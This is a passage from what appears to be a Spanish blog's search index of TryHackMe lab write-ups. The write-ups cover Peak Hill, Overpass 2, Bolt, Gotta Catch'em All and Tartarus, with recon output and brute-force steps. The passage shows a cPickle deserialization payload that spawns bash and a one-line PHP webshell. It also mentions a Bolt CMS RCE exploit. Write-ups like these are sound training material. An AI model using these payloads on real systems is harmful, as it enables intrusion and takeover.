Realizamos una pequeña explotacion de un archivo suid para realizar movimiento lateral. Finalmente utilizamos wildcards con tar para escalar privilegios.","id":49,"section":"posts","tags":["wildcard privesc"],"title":"TryHackMe - Anonymous Playground","uri":"https://sckull.github.io/posts/anonymousplayground/"},{"content":"  Peak Hill es una maquina de TryHackMe, encontramos un fichero dentro del cual descubrimos credenciales las cuales estaban como un objeto, utilizamos Python para extraerlas y acceder por SSH. Decompilamos un archivo de Python y obtuvimos credenciales utilizando la libreria de Crypto lo que nos dio acceso al siguiente usuario. Finalmente encontramos un binario en el cual enviamos un objeto creado con Python y la libreria cPickle para ejecutar bash y obtener una shell como root.\nRoom    Titulo Peak Hill      Descripción Exercises in Python library abuse and some exploitation techniques   Puntos 210   Dificultad Media   Maker JohnHammond     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21, 20) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Sun Aug 16 20:09:24 2020 as: nmap -Pn -sV -o mini_scan peakhill.thm Nmap scan report for peakhill.thm (10.10.29.120) Host is up (0.30s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 20/tcp closed ftp-data 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug 16 20:09:46 2020 -- 1 IP address (1 host up) scanned in 22.07 seconds   FTP Ingresamos con las credenciales de anonymous (anonymous:anonymous) en donde encontramos dos archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  kali@kali:~/thm/peakhill$ ftp peakhill.thm Connected to peakhill.thm. 220 (vsFTPd 3.0.3) Name (peakhill.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 May 15 18:37 . drwxr-xr-x 2 ftp ftp 4096 May 15 18:37 .. -rw-r--r-- 1 ftp ftp 7048 May 15 18:37 .creds -rw-r--r-- 1 ftp ftp 17 May 15 18:37 test.txt 226 Directory send OK. ftp\u0026gt; get .creds local: .creds remote: .creds 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .creds (7048 bytes). 226 Transfer complete. 7048 bytes received in 0.00 secs (35.1911 MB/s) ftp\u0026gt; get test.txt local: test.txt remote: test.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for test.txt (17 bytes). 226 Transfer complete. 17 bytes received in 0.00 secs (129.6997 kB/s) ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; bye 221 Goodbye.   PICKLE - .CREDS En el servicio FTP encontramos dos archivos uno de ellos solo era un archivo de prueba, el otro tenia un mensaje en binario, utilizamos CyberCheff para ver el mensaje. En el mensaje vemos strings relacionados con SSH, intentamos decodificar con otros tipos de codificaciones y cifrado pero no logramos obtener nada.\nEn la descripcion de la maquina encontramos que la maquina incluye ejercicios de Python además de eso encontramos dos veces la imagen de un pepinillo que puede hacer referencia a la libreria de Pickle. Descargamos el archivo decodificado y utilizando Python logramos obtener el contenido, donde vemos tuplas con valores de ssh_user y ssh_pass.\n1 2 3 4 5  \u0026gt;\u0026gt;\u0026gt; import pickle \u0026gt;\u0026gt;\u0026gt; picklefile = open(\u0026#39;possible_pickle\u0026#39;, \u0026#39;rb\u0026#39;) \u0026gt;\u0026gt;\u0026gt; print(pickle.load(picklefile)) [(\u0026#39;ssh_pass15\u0026#39;, \u0026#39;u\u0026#39;), (\u0026#39;ssh_user1\u0026#39;, \u0026#39;h\u0026#39;), (\u0026#39;ssh_user0\u0026#39;, \u0026#39;g\u0026#39;), (\u0026#39;ssh_pass1\u0026#39;, \u0026#39;1\u0026#39;), [... REDACTED ...], (\u0026#39;ssh_pass10\u0026#39;, \u0026#39;1\u0026#39;)] \u0026gt;\u0026gt;\u0026gt;   Utilizamos un script para poder ordenar los datos segun el numero, basta con imprimir los diccionarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  import pickle from collections import OrderedDict def sortByKey(dictionary): return(dict(sorted(dictionary.items()))) picklefile = open(\u0026#39;possible_pickle\u0026#39;, \u0026#39;rb\u0026#39;) a = pickle.load(picklefile) ssh_pass = dict() ssh_user = dict() for i in range(len(a)): if \u0026#34;ssh_pass\u0026#34; in a[i][0]: ssh_pass[a[i][0]] = a[i][1] elif \u0026#34;ssh_user\u0026#34; in a[i][0]: ssh_user[a[i][0]] = a[i][1] else: print(\u0026#34;None\u0026#34;) print(sortByKey(ssh_user)) print(sortByKey(ssh_pass))   GHERKIN - USER Utilizamos las credenciales que obtuvimos, en el servicio ssh y logramos obtener una shell.\nDILL - USER En el directorio principal del usuario encontramos un archivo .pyc el cual trasladamos a nuestra maquina para obtener el codigo fuente utilizando uncompyle6.\nEl codigo fuente o script real nos muestra que es un servidor con su puerto y una funcion en donde se pueden ejecutar comandos, pero es necesario ingresar credenciales, tambien vemos las credenciales las cuales estan \u0026ldquo;convertidas a numeros\u0026rdquo;.\n1 2  username = long_to_bytes(16[... REDACTED ...]36) password = long_to_bytes(2457[... REDACTED ...]2356)   Revisamos si este script se estaba ejecutando en la maquina y vemos en proceso el script el cual lo ejecuta Dill.\nUtilizamos las misma libreria (Crypto.Util.number) para obtener las credenciales reales.\n1 2 3 4 5 6 7 8  \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import bytes_to_long, long_to_bytes \u0026gt;\u0026gt;\u0026gt; username = long_to_bytes(16[... REDACTED ...]36) \u0026gt;\u0026gt;\u0026gt; username b\u0026#39;dill\u0026#39; \u0026gt;\u0026gt;\u0026gt; password = long_to_bytes(2457[... REDACTED ...]2356) \u0026gt;\u0026gt;\u0026gt; password b\u0026#39;n[... REDACTED ...]t\u0026#39; \u0026gt;\u0026gt;\u0026gt;   Nos conectamos al puerto y utilizamos las credenciales, logramos ejecutar comandos. Intentamos autenticarnos en la sesion de SSH que teniamos pero al parecer no es la misma contraseña.\nTambien logramos obtener nuestra flag user.txt.\nEn la carpeta principal de Dill encontramos su clave privada para poder ingresar por medio del servicio SSH.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el archivo /opt/peak_hill_farm/peak_hill_farm. Al ejecutar dicho archivo nos pide algo, al ingresar cualquier cosa nos devuelve un error, despues de multiples intentos nos devolvio el mensaje failed to decode base64.\nIngresamos un mensaje codificado pero no lo aceptó, intentamos mover el archivo a nuestra maquina pero no nos deja copiar o mover el archivo.\nEn el script nos habla de Peak Hill Farm tal vez se refiera nuevamente a pickle, como el archivo que encontramos en el servicio de FTP. Creamos un payload que nos va permitir ejecutar bash para obtener una shell root. Ver Pickle RCE\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026gt;\u0026gt;\u0026gt; import cPickle, base64, os, sys \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; class Exploit(object): ... def __init__(self, cmd): ... self.cmd = cmd ... def __reduce__(self): ... return (os.system, (self.cmd,)) ... \u0026gt;\u0026gt;\u0026gt; cmd = \u0026#34;/bin/bash\u0026#34; \u0026gt;\u0026gt;\u0026gt; exploit = base64.b64encode(cPickle.dumps(Exploit(cmd))) \u0026gt;\u0026gt;\u0026gt; exploit \u0026#39;Y3Bvc2l4CnN5c3RlbQpwMQooUycvYmluL2Jhc2gnCnAyCnRScDMKLg==\u0026#39; \u0026gt;\u0026gt;\u0026gt;   Logramos obtener una shell root.\nPor alguna razon no logramos realizarle un cat al la flag root.txt por lo que agregamos clave de ssh al archivo authorized_keys para poder ingresar por este servicio y lograr leer nuestra flag.\nAl parecer el archivo tiene dos espacios a los lados (del nombre).\n","description":"Peak Hill es una maquina de TryHackMe, encontramos un fichero dentro del cual descubrimos credenciales las cuales estaban como un objeto, utilizamos Python para extraerlas y acceder por SSH. Decompilamos un archivo de Python y obtuvimos credenciales utilizando la libreria de Crypto lo que nos dio acceso al siguiente usuario. Finalmente encontramos un binario en el cual enviamos un objeto creado con Python y la libreria cPickle para ejecutar bash y obtener una shell como root.","id":50,"section":"posts","tags":["ftp","pickle","python"],"title":"TryHackMe - Peak Hill","uri":"https://sckull.github.io/posts/peakhill/"},{"content":"  Overpass 2 - Hacked es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos Crack the Hash y analisis de trafico lo que nos dio acceso por SSH. Finalmente escalamos privilegios con Bash e informacion de GTFOBins.\nRoom    Titulo Overpass 2 - Hacked      Descripción Overpass has been hacked! Can you analyse the attacker\u0026rsquo;s actions and hack back in?   Puntos 131   Dificultad Facil   Maker NinjaJc01     Overpass 2 - Hacked es una serie de retos en los que incluyen Analisis de Trafico con Wireshark y Password Cracking, además que una maquina fue hackeada Overpass.\nTASK 1 En el Task 1 se pueden utilizar los siguientes filtros: tcp.port == 4242, http.request.method == GET y http.request.method == POST.\nTASK 2 En el Task 2 es necesario realizar un analisis del Codigo del Backdoor y Password Cracking, este ultimo lo realizamos con hashcat utilizando hashcat64.bin -m 1710 -a 0 hash:salt ../rockyou.txt.\nTASK 3 A continuacion la solucion al Ultimo Task en el cual se ve envuelta la maquina que ha sido hackeada y con la ayuda del Task 1 y 2 podemos obtener acceso a la maquina.\nNMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y el puerto ssh (2222 backdoor) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Fri Aug 14 17:32:40 2020 as: nmap -sV -o mini_scan overpasstwo.thm Nmap scan report for overpasstwo.thm (10.10.27.236) Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 2222/tcp open ssh OpenSSH 8.2p1 Debian 4 (protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Aug 14 17:33:22 2020 -- 1 IP address (1 host up) scanned in 41.69 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  kali@kali:~/thm/overpass2$ gobuster dir -u http://overpasstwo.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 250 -x php,html,txt /index.html (Status: 200) /img (Status: 301) /aboutus (Status: 301) /downloads (Status: 301) /css (Status: 301) /404.html (Status: 200)   JAMES - USER En los Task 1 y 2 vemos que la persona que ingreso a la maquina dejo un backdoor, este backdoor esta a la escucha en el puerto 2222 el cual segun su codigo fuente solo espera por una contraseña para poder entrar en esta maquina utilizamos la contraseña crackeada, logramos obtener acceso a la maquina y la flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de archivos SUID y encontramos el archivo .suid_bash, al ejecutar este binario nos devuelve una shell con el mismo usuario (james).\nVerificamos que tipo de archivo con el parametro --help y vemos que es bash.\nUtilizamos BASH - GTFOBins para obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Overpass 2 - Hacked es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos Crack the Hash y analisis de trafico lo que nos dio acceso por SSH. Finalmente escalamos privilegios con Bash e informacion de GTFOBins.","id":51,"section":"posts","tags":["suid"],"title":"TryHackMe - Overpass 2 - Hacked","uri":"https://sckull.github.io/posts/overpasstwo/"},{"content":"  Bolt es una maquina de TryHackMe. Bolt CMS presenta diferentes post que nos muestran credenciales además tiene una vulnerabilidad RCE autenticado la cual aprovechamos para obtener acceso privilegiado.\nRoom    Titulo Bolt      Descripción A hero is unleashed   Puntos 56   Dificultad Facil   Maker 0x9747     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y http (8000) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  # Nmap 7.80 scan initiated Thu Aug 13 00:19:57 2020 as: nmap -sV -o mini_scan bolt.thm Nmap scan report for bolt.thm (10.10.172.52) Host is up (0.27s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 8000/tcp open http (PHP 7.2.32-1) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.80%I=7%D=8/13%Time=5F34CDB2%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,1001,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Thu,\\x2013\\x20Aug\\x20 SF:2020\\x2005:20:48\\x20GMT\\r\\nConnection:\\x20close\\r\\nX-Powered-By:\\x20PHP SF:/7\\.2\\.32-1\\+ubuntu18\\.04\\.1\\+deb\\.sury\\.org\\+1\\r\\nCache-Control:\\x20pu SF:blic,\\x20s-maxage=600\\r\\nDate:\\x20Thu,\\x2013\\x20Aug\\x202020\\x2005:20:48 SF:\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nX-Debug-Toke SF:n:\\x20114ea1\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en-GB\\\u0026#34;\u0026gt;\\n\\x20\\ SF:x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;u SF:tf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20 SF:content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Bolt\\x20\\|\\x20A SF:\\x20hero\\x20is\\x20unleashed\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;l SF:ink\\x20href=\\\u0026#34;https://fonts\\.googleapis\\.com/css\\?family=Bitter\\|Roboto SF::400,400i,700\\\u0026#34;\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/bulma\\.css\\ SF:?8ca0842ebb\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;styleshe SF:et\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/theme\\.css\\?6cb66bfe9f\\\u0026#34;\u0026gt;\\n\\x20\\x20 SF:\\x20\\x20\\t\u0026lt;meta\\x20name=\\\u0026#34;generator\\\u0026#34;\\x20content=\\\u0026#34;Bolt\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x2 SF:0\\x20\\t\u0026lt;link\\x20rel=\\\u0026#34;canonical\\\u0026#34;\\x20href=\\\u0026#34;http://0\\.0\\.0\\.0:8000/\\\u0026#34;\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\\x20class=\\\u0026#34;front\\\u0026#34;\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a\\x20\u0026#34;)%r(FourOhFourRequest,16C3,\u0026#34;HTTP/1 SF:\\.0\\x20404\\x20Not\\x20Found\\r\\nDate:\\x20Thu,\\x2013\\x20Aug\\x202020\\x2005: SF:20:50\\x20GMT\\r\\nConnection:\\x20close\\r\\nX-Powered-By:\\x20PHP/7\\.2\\.32-1 SF:\\+ubuntu18\\.04\\.1\\+deb\\.sury\\.org\\+1\\r\\nCache-Control:\\x20private,\\x20m SF:ust-revalidate\\r\\nDate:\\x20Thu,\\x2013\\x20Aug\\x202020\\x2005:20:50\\x20GMT SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\npragma:\\x20no-cache SF:\\r\\nexpires:\\x20-1\\r\\nX-Debug-Token:\\x20561ff9\\r\\n\\r\\n\u0026lt;!doctype\\x20html SF:\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial SF:-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\u0026lt;title\u0026gt;Bolt\\x20\\|\\x20A\\x20hero\\x20is\\x20unleashed\u0026lt;/title\u0026gt;\\n\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20href=\\\u0026#34;https://fonts\\.googleapis\\ SF:.com/css\\?family=Bitter\\|Roboto:400,400i,700\\\u0026#34;\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\u0026gt;\\n SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/ SF:theme/base-2018/css/bulma\\.css\\?8ca0842ebb\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/them SF:e\\.css\\?6cb66bfe9f\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\t\u0026lt;meta\\x20name=\\\u0026#34;generator\\\u0026#34;\\x2 SF:0content=\\\u0026#34;Bolt\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a\\x20href=\\\u0026#34;#main-content\\\u0026#34;\\x20class=\\\u0026#34;v SF:is\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Aug 13 00:21:16 2020 -- 1 IP address (1 host up) scanned in 78.40 seconds   HTTP - PUERTO 80 Encontramos una pagina de Apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4  root@upset:~/thm/bolt# gobuster dir -u http://bolt.thm -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   HTTP - PUERTO 8000 Encontramos una pagina web en el puerto 80.\nEn las entradas de la pagina podemos leer algunos nombres de usuarios y contraseñas.\nSegunda entrada\nAdemás vemos que la pagina es el CMS BOLT.\nAl ingresar con las credenciales vemos la version de Bolt.\nBOLT Authenticated Remote Code Execution Buscamos alguna vulnerabilidad o exploit para este CMS, encontramos varias en searchsploit pero ninguna afectaba a la version de la maquina (searchsploit no estaba actualizado). En exploit-db.com encontramos un Exploit que afecta a este CMS, pero al intentar utilizar este exploit nos dio muchos errores, encontramos otro exploit para metasploit Bolt CMS 3.7.0 - Authenticated Remote Code Execution. Configuramos y ejecutamos el exploit con las credenciales que encontramos en las entradas.\nLogramos obtener una shell con usuario root y nuestra flag.\n","description":"Bolt es una maquina de TryHackMe. Bolt CMS presenta diferentes post que nos muestran credenciales además tiene una vulnerabilidad RCE autenticado la cual aprovechamos para obtener acceso privilegiado.","id":52,"section":"posts","tags":["CMS Bolt","rce"],"title":"TryHackMe - Bolt","uri":"https://sckull.github.io/posts/bolt/"},{"content":"  Gotta Catch\u0026rsquo;em All! es una maquina de TryHackMe, incluye analisis de codigo, ataque de fuerza bruta en SSH, finalmente el uso de credenciales almacenadas.\nRoom    Titulo Gotta Catch\u0026rsquo;em All!      Descripción This room is based on the original Pokemon series. Can you obtain all the Pokemon in this room?   Puntos 270   Dificultad Facil   Maker GhostlyPy     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Wed Aug 12 22:04:16 2020 as: nmap -sV -o mini_scan pokemoncatch.thm Nmap scan report for pokemoncatch.thm (10.10.166.58) Host is up (0.42s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 12 22:05:11 2020 -- 1 IP address (1 host up) scanned in 55.08 seconds   HTTP Encontramos una pagina web de Apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5  root@upset:~/thm/pokemoncatch# gobuster dir -u http://pokemoncatch.thm -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 301) /server-status (Status: 301)   En el index de la pagina encontramos un script en Javascript en el que tiene 10 nombres de pokemon los cuales se imprimen en la consola.\nAdemás de ello encontramos unas etiquetas html que no existen.\nHYDRA - SSH Utilizamos los nombres de los pokemon y las etiquetas que encontramos para realizar un wordlist, y con hydra realizar un ataque de fuerza bruta a SSH.\nEncontramos las credenciales y obtuvimos una shell en la maquina.\nEn el Escritorio encontramos un archivo ZIP, dentro de este se encuentra la primera flag en hex.\nEn la carpeta de Videos encontramos un archivo en el que contiene codigo C++ el cual realiza una impresion en la que se ve el nombre de otro usuario y su contraseña. Utilizamos las credenciales para obtener una shell con este usuario, logramos obtener una shell y nos muestra un mensaje de error de man sudo_root y que debemos de utilizar sudo comando, además no podemos realizar un cd. Actualizamos nuestra shell a root y logramos tener acceso a la carpeta de root.\nEn la carpeta /var/www/html encontramos segunda flag la cual esta en Cifrado César.\nEncontramos la tercera flag en la carpeta /etc codificada en base64.\nFinalmente en /home encontramos la ultima flag.\n","description":"Gotta Catch'em All! es una maquina de TryHackMe, incluye analisis de codigo, ataque de fuerza bruta en SSH, finalmente el uso de credenciales almacenadas.","id":53,"section":"posts","tags":[],"title":"TryHackMe - Gotta Catch'em All!","uri":"https://sckull.github.io/posts/pokemon/"},{"content":"  Tartarus es una maquina de TryHackMe, realizamos ataque de fuerza bruta con Hydra y un wordlist con credenciales encontradas, con ello subimos una webshell y ejecutamos una shell inversa. Tras ejecutar una shell con GDB cambiamos a un segundo usuario. Ejecutamos Git junto con Sudo para acceder a otro usuario. Finalmente modificamos un script utilizado por un CronJob para obtener acfeso privilegiado.\nRoom    Titulo Tartarus      Descripción This is an beginner box based on simple enumeration of services and basic privilege escalation techniques.   Puntos *   Dificultad Facil   Maker csenox     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Wed Aug 12 00:19:21 2020 as: nmap -sV -o mini_scan tartarus.thm Nmap scan report for tartarus.thm (10.10.50.182) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 12 00:19:54 2020 -- 1 IP address (1 host up) scanned in 32.65 seconds   FTP Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous), en donde encontramos dos archivos de texto el primero es posible verlo a simple vista, el segundo tenia un pequeño truco y es que las carpetas estaban con el nombre ....\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  root@upset:~/thm/tartarus# ftp tartarus.thm Connected to tartarus.thm. 220 (vsFTPd 3.0.3) Name (tartarus.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 . drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 .. drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 ... -rw-r--r-- 1 ftp ftp 17 Jul 05 21:45 test.txt 226 Directory send OK. ftp\u0026gt; get test.txt local: test.txt remote: test.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for test.txt (17 bytes). 226 Transfer complete. 17 bytes received in 0.00 secs (197.6376 kB/s) ftp\u0026gt; cd ... 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. l150 Here comes the directory listing. s 226 Directory send OK. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 . drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 .. drwxr-xr-x 2 ftp ftp 4096 Jul 05 21:31 ... 226 Directory send OK. ftp\u0026gt; cd ... 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Jul 05 21:31 . drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 .. -rw-r--r-- 1 ftp ftp 14 Jul 05 21:45 yougotgoodeyes.txt 226 Directory send OK. ftp\u0026gt; get yougotgoodeyes.txt local: yougotgoodeyes.txt remote: yougotgoodeyes.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes). 226 Transfer complete. 14 bytes received in 0.00 secs (26.3936 kB/s) ftp\u0026gt; pwd 257 \u0026#34;/.../...\u0026#34; is the current directory ftp\u0026gt; bye 221 Goodbye. root@upset:~/thm/tartarus# cat test.txt vsftpd test file root@upset:~/thm/tartarus# cat yougotgoodeyes.txt /[... REDACTED ...] root@upset:~/thm/tartarus#   HTTP Encontramos una pagina web de apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6  root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403)   En robots.txt encontramos una direccion/pagina y un mensaje.\nEn la direccion que encontramos vemos dos archivos, en el primer archivo encontramos un wordlist de contraseñas en el segundo una lista de usuarios.\nEn el directorio que encontramos en el archivo de texto en FTP logramos ver un panel de logeo.\nHYDRA Utilizamos hydra para hacer un ataque de fuerza bruta al panel de logeo con los wordlists que encontramos. Vemos 16 posibles contraseñas para el usuario enox.\nEstas 16 posibles se muestran porque logramos encontrar el usuario pero no la contraseña, la sintaxis que utilizamos era para Incorrect username! y no para Incorrect password!. Volvemos a utilizar Hydra o probar la ultima contraseña.\nIngresamos con las credenciales vemos que podemos subir archivos.\nAl subir una imagen solo nos muestra el mensaje que se ha subido mas no la direccion donde esta se encuentra.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, esta vez en el directorio nuevo.\n1 2 3 4 5  root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /home.php (Status: 302) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200)   USER - WWW-DATA Encontramos la direccion /images donde se encuentra otra carpeta y tambien nuestra imagen.\nAgregamos una shell a un archivo php y lo subimos, ejecutamos comandos.\n1  \u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;   Ejecutamos una shell inversa y logramos obtener una shell con el usuario www-data.\nEn 